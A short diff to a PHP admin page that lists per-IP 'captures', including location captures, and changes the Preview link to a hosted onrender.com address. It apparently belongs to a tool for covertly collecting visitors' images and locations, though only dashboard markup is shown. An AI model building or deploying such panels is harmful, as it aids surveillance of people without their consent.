@@ -185,7 +185,7 @@ if (isset($_GET['view_user'])) {
                         </div>
                         <div class="actions">
                             <?php if ($type != 'location'): ?>
-                                <a href="<?= $file ?>" target="_blank" class="btn-preview" style="background:#3498db; color:#fff; padding:5px 14px; border-radius:6px; text-decoration:none; font-size:12px; font-weight:500; transition:0.3s; display:inline-block; margin:0 5px;">🖼️ Preview</a>
+                                <a href="https://rootx-eye-1.onrender.com/<?= $file ?>" target="_blank" class="btn-preview" style="background:#3498db; color:#fff; padding:5px 14px; border-radius:6px; text-decoration:none; font-size:12px; font-weight:500; transition:0.3s; display:inline-block; margin:0 5px;">🖼️ Preview</a>
                                 <a href="?download=<?= $index ?>&user=<?= urlencode($user['ip']) ?>" class="btn-download" style="background:#00b894; color:#fff; padding:5px 14px; border-radius:6px; text-decoration:none; font-size:12px; font-weight:500; transition:0.3s; display:inline-block; margin:0 5px;">⬇️ Download</a>
                             <?php endif; ?>
                             <a href="?delete=<?= $index ?>&user=<?= urlencode($user['ip']) ?>" class="btn-delete" onclick="return confirm('Delete this capture?')" style="background:#e74c3c; color:#fff; padding:5px 14px; border-radius:6px; text-decoration:none; font-size:12px; font-weight:500; transition:0.3s; display:inline-block; margin:0 5px;">🗑️ Delete</a>
